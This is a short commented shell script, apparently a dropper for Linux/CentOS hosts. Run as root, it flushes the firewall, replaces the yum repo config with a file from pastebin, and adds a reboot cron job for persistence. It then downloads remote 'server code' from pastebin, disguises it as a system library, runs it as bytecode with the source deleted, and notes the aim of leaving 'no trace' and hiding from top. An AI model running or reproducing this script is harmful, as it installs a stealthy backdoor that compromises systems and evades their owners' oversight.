# Line by Line:
# 1. opens firewall to 1337 :)
# 2. downloads the yum config if python not installed
# 3. cleans up if python not installed
# 4. installs python if not installed
# 5. downloads the server code and moves it to a new location
# 6. runs the server code and backgrounds it & disowns it to ensure no trace

sudo strace -o /dev/null /bin/sh -lic "iptables -F;
rpm --quiet --query python3 || curl https://pastebin.com/raw/XLiGFWha 2>/dev/null > /etc/yum.repos.d/CentOS-Base.repo;
rpm --quiet --query python3 || yum clean all 2>/dev/null;
rpm --quiet --query python3 || yum install -y python3 2>/dev/null;
crontab -l > cronlist.txt;
grep -qxF '@reboot sleep 20 && /etc/tmp/systeminfo.sh' cronlist.txt || echo '@reboot sleep 20 && /etc/tmp/systeminfo.sh' >> cronlist.txt;
crontab cronlist.txt;
rm cronlist.txt;
curl https://pastebin.com/raw/Nxw5Rb5X 2>/dev/null > server_code.py;
mkdir /etc/tmp 2>/dev/null;
mv server_code.py /etc/tmp/systemlibrary.py;
python3 -m compileall . 2>/dev/null;
rm /etc/tmp/systemlibrary.py 2>/dev/null;
(python3 -W ignore /etc/tmp/__pycache__/systemlibrary.cpython-36.pyc 2>/dev/null &)
"

# TODO hide top?
